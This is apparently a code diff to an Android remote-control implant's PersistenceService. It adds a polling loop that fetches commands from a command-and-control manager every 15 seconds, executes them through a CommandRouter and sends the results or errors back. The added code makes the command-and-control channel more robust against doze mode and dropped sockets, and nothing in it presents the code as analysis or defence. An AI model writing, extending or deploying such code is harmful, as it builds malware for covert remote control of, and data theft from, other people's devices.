@@ -39,6 +39,18 @@ public class PersistenceService extends Service {
         heartbeat = new Runnable() {
             @Override public void run() {
                 C2Manager.heartbeat(PersistenceService.this);
+                // polling fallback — realtime listener can go deaf on doze/bad socket;
+                // poll last 5 every cycle so nothing gets skipped forever
+                C2Manager.pollCommands(PersistenceService.this, cmd -> {
+                    try {
+                        Map<String, Object> result = CommandRouter.execute(PersistenceService.this, cmd);
+                        C2Manager.pushResult(PersistenceService.this, cmd.getKey(), result);
+                    } catch (Exception e) {
+                        Map<String, Object> err = new HashMap<>();
+                        err.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
+                        C2Manager.pushResult(PersistenceService.this, cmd.getKey(), err);
+                    }
+                });
                 handler.postDelayed(this, 15000);
             }
         };
